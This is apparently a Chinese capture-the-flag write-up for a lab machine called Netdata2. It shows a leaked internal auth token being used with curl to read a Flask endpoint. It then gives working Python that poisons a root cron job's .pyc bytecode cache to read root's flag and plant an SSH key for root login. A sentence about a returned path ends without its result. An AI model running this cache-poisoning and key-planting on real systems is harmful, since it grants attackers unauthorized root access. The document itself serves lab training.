## 二、漏洞复现

NetData 版本：netdata v1.47.5

在泄露的信息当中，我们得到了这样一组关键的 JSON 信息

```json
"host_labels": {
    "_internal_api_auth_header": "X-Internal-Auth",
    "_internal_api_auth_token": "s3cr3t_t0k3n_f0r_4dm1n",
    "_internal_api_url": "http://127.0.0.1:8443/api/flag"
}
```

数据暴露了 Port 8443 的 Werkzeug/Flask 应用中存在一个仅限本地（127.0.0.1）或者特定鉴权才能访问的接口 `/api/flag`

而在我们的 Nmap 扫描中是对外开放的（0.0.0.0:8443），我们可以直接从外部携带以上得到的 Header 发送请求，来获取信息

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ curl -s -X GET "http://192.168.101.147:8443/api/flag" \
     -H "X-Internal-Auth: s3cr3t_t0k3n_f0r_4dm1n"
{"flag":"/b7a46cd4-3c6a-4fe9-b432-6aa60fc1c0d7"}
```

得到 `{"flag":"/b7a46cd4-3c6a-4fe9-b432-6aa60fc1c0d7"}`，因为带着 `/`（斜杠），或许它是一个路径吧，尝试直接访问，果然返回了这样一串内容：

## 三、权限提升

上传 LinPEAS 进行扫描后分析结果，可能的提权链为：

`kendrals -> root 的 cron -> 可写 python 的字节码缓存 -> root`

```bash
kendrals@Netdata2:~$ python3 - <<'PY'
> from pathlib import Path
import marshal

p = Path("/opt/backup/__pycache__/backup_utils.cpython-314.pyc")
old = p.read_bytes()

payload = """
from pathlib import Path
Path('/home/kendrals/root_flag_copy').write_text(
    Path('/root/root.txt').read_text()
)
"""

p.write_bytes(old[:16] + marshal.dumps(compile(payload, "<backup_utils>", "exec")))
> PY

kendrals@Netdata2:~$ cat root_flag_copy
flag{root-57ef9bf79ec87b8179360756328fc252}
```

拿到 root-shell，Python 注入是 root 执行的。最稳妥的方式是让 root 任务把当前用户的 SSH 公钥写入 `/root/.ssh/authorized_keys`，然后 SSH 登录 root

```bash
python3 - <<'PY'
from pathlib import Path
import marshal

p = Path("/opt/backup/__pycache__/backup_utils.cpython-314.pyc")
old = p.read_bytes()

payload = """
import os
import shutil

os.makedirs('/root/.ssh', mode=0o700, exist_ok=True)
shutil.copyfile(
    '/home/kendrals/.ssh/id_ecdsa.pub',
    '/root/.ssh/authorized_keys'
)
os.chown('/root/.ssh', 0, 0)
os.chown('/root/.ssh/authorized_keys', 0, 0)
os.chmod('/root/.ssh/authorized_keys', 0o600)
"""

p.write_bytes(old[:16] + marshal.dumps(compile(payload, "<backup_utils>", "exec")))
PY

ssh -i /home/kendrals/.ssh/id_ecdsa root@127.0.0.1
```

输入我们从 web 层面得到的 key，`legolas`，最终拿到 root 权限
